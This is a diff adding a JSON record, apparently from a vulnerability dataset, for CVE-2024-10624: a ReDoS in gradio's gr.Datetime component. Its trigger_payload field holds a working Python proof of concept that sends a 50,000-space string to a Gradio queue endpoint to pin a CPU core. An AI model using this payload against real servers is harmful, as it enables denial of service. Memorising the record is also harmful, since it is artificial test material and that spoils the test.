@@ -1,0 +1,15 @@
+{
+  "file_id": "350_gradio_huntr_e8d0b248-8feb-4c23-9ef9-be4d1e868374",
+  "numeric_id": "350",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Inefficient regular expression in gr.Datetime component causes ReDoS via polynomial time matching",
+  "cve": "CVE-2024-10624",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "gradio",
+  "affected_version": "git 98cbcae",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\nimport json\npost_url = 'http://127.0.0.1:7860/queue/join?'\nexp_string = \"now\"+\" \"*50000+\"1\"\npost_data = {\n\"data\": [exp_string],\n\"event_data\": None,\n\"fn_index\": 0,\n\"trigger_id\": 3,\n\"session_hash\": \"pc79toqe2jj\"\n}\njson_data = json.dumps(post_data)\nrequests.post(post_url, data=json_data)\nget_url = \"http://127.0.0.1:7860/queue/data?session_hash=pc79toqe2jj\"\nresp = requests.get(get_url)\nprint(resp)",
+  "oracle": "Server takes arbitrary long time to respond and one CPU core is at 100% during processing"
+}
